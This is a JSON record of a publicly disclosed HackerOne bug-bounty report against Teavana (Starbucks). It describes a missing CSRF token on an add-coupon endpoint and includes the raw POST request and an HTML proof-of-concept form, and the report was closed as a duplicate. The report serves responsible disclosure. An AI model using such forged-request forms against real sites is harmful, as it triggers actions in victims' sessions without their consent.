{"id":227725,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yMjc3MjU=","url":"https://hackerone.com/reports/227725","title":"Missing CSRF Token On Add Coupon To Basket","state":"Closed","substate":"duplicate","severity_rating":"low","readable_substate":"Duplicate","created_at":"2017-05-11T15:58:00.382Z","submitted_at":"2017-05-11T15:58:00.382Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"apapedulimu","url":"/apapedulimu","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/158/407/aeaf392e2bc7283dea36aa24392b2f2d1ceee72c_original.jpg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":1989,"url":"https://hackerone.com/starbucks","handle":"starbucks","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/001/989/c9aa38cf3b1a91daa085d31e23d23f34cd1874df_original./3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/001/989/c9aa38cf3b1a91daa085d31e23d23f34cd1874df_original./eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Starbucks","twitter_handle":"Starbucks","website":"http://www.starbucks.com","about":"Inspiring and nurturing the human spirit -- one person, one cup, one neighborhood at a time."}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2019-01-22T23:22:45.649Z","bug_reporter_agreed_on_going_public_at":"2017-05-11T17:31:39.631Z","team_member_agreed_on_going_public_at":"2019-01-22T23:22:45.382Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Hi,\nWhen Adding Coupun It's missing CSRF Token, and at this time, i use `BOGO50` Coupun to reproduce it.\n\n__Vuln Request__\n```\nPOST /on/demandware.store/Sites-Teavana-Site/default/Home-AddCouponToBasket?couponcode=BOGO50\u0026format=ajax HTTP/1.1\nHost: www.teavana.com\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 0\nCookie: \u003csome cookie\u003e\nConnection: close\nUpgrade-Insecure-Requests: 1\n\n```\n\n__PoC Code__\n```\n\u003chtml\u003e\n\u003cbody\u003e\n\u003cform action=\"https://www.teavana.com/on/demandware.store/Sites-Teavana-Site/default/Home-AddCouponToBasket?couponcode=BOGO50\u0026format=ajax\" method=\"POST\"\u003e\n\u003cinput type=\"hidden\" name=\"\" value=\"\" /\u003e\n\u003cinput type=\"submit\" value=\"Submit request\" /\u003e\n\u003c/form\u003e\n\u003c/body\u003e\n\u003c/html\u003e\n```\n\nThanks, \nIf you need video, i will create one !","vulnerability_information_html":"\u003cp\u003eHi,\u003cbr\u003e\nWhen Adding Coupun It\u0026#39;s missing CSRF Token, and at this time, i use \u003ccode\u003eBOGO50\u003c/code\u003e Coupun to reproduce it.\u003c/p\u003e\n\n\u003cp\u003e\u003cstrong\u003eVuln Request\u003c/strong\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ePOST /on/demandware.store/Sites-Teavana-Site/default/Home-AddCouponToBasket?couponcode=BOGO50\u0026amp;format=ajax HTTP/1.1\nHost: www.teavana.com\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 0\nCookie: \u0026lt;some cookie\u0026gt;\nConnection: close\nUpgrade-Insecure-Requests: 1\n\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003e\u003cstrong\u003ePoC Code\u003c/strong\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight html\"\u003e\u003ccode\u003e\u003cspan class=\"nt\"\u003e\u0026lt;html\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;body\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;form\u003c/span\u003e \u003cspan class=\"na\"\u003eaction=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;https://www.teavana.com/on/demandware.store/Sites-Teavana-Site/default/Home-AddCouponToBasket?couponcode=BOGO50\u0026amp;format=ajax\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003emethod=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;POST\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;input\u003c/span\u003e \u003cspan class=\"na\"\u003etype=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;hidden\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003ename=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003evalue=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;\u0026quot;\u003c/span\u003e \u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;input\u003c/span\u003e \u003cspan class=\"na\"\u003etype=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;submit\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003evalue=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;Submit request\u0026quot;\u003c/span\u003e \u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/form\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/body\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/html\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThanks, \u003cbr\u003e\nIf you need video, i will create one !\u003c/p\u003e\n","weakness":{"id":45,"name":"Cross-Site Request Forgery (CSRF)"},"original_report_id":226020,"original_report_url":"https://hackerone.com/reports/226020","attachments":[],"allow_singular_disclosure_at":null,"vote_count":8,"voters":["mygf","apapedulimu","n00bsec","rugb","vincentlaw1","dimasaprilian993","reppie","lovebugpaul"],"severity":{"rating":"low","author_type":"User"},"structured_scope":{"databaseId":13009,"asset_type":"URL","asset_identifier":"www.teavana.com","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":1668493,"is_internal":false,"editable":false,"type":"Activities::BugDuplicate","message":"Hi @apapedulimu, \n\nThank you for your submission. Unfortunately, we had previously been made aware of this issue by another hacker. That being said I will close this as `Duplicate`. \n\nThank you for participating in the Starbucks bug bounty program. We look forward to more reports from you in the future.\n\nBest Regards, \n@overice ","markdown_message":"\u003cp\u003eHi \u003ca href=\"/apapedulimu\"\u003e@apapedulimu\u003c/a\u003e, \u003c/p\u003e\n\n\u003cp\u003eThank you for your submission. Unfortunately, we had previously been made aware of this issue by another hacker. That being said I will close this as \u003ccode\u003eDuplicate\u003c/code\u003e. \u003c/p\u003e\n\n\u003cp\u003eThank you for participating in the Starbucks bug bounty program. We look forward to more reports from you in the future.\u003c/p\u003e\n\n\u003cp\u003eBest Regards, \u003cbr\u003e\n\u003ca href=\"/overice\"\u003e@overice\u003c/a\u003e \u003c/p\u003e\n","automated_response":false,"created_at":"2017-05-11T17:28:22.823Z","updated_at":"2017-05-11T17:28:22.823Z","original_report_id":226020,"actor":{"username":"overice","cleared":false,"url":"/overice","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/161/018/993b2d44b7dea7bd979efa3030b9456f04690408_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1668501,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2017-05-11T17:31:39.650Z","updated_at":"2017-05-11T17:31:39.650Z","first_to_agree":true,"actor":{"username":"apapedulimu","cleared":true,"url":"/apapedulimu","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/158/407/aeaf392e2bc7283dea36aa24392b2f2d1ceee72c_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3694519,"is_internal":false,"editable":false,"type":"Activities::ChangedScope","message":"","markdown_message":"","automated_response":false,"created_at":"2018-11-21T19:55:07.351Z","updated_at":"2018-11-21T19:55:07.351Z","actor":{"username":"overice","cleared":false,"url":"/overice","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/161/018/993b2d44b7dea7bd979efa3030b9456f04690408_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"old_scope":"None","new_scope":"www.teavana.com","genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4021329,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-01-22T23:22:45.533Z","updated_at":"2019-01-22T23:22:45.533Z","actor":{"username":"nitrobr3w","cleared":false,"url":"/nitrobr3w","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4021330,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-01-22T23:22:45.804Z","updated_at":"2019-01-22T23:22:45.804Z","actor":{"username":"nitrobr3w","cleared":false,"url":"/nitrobr3w","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}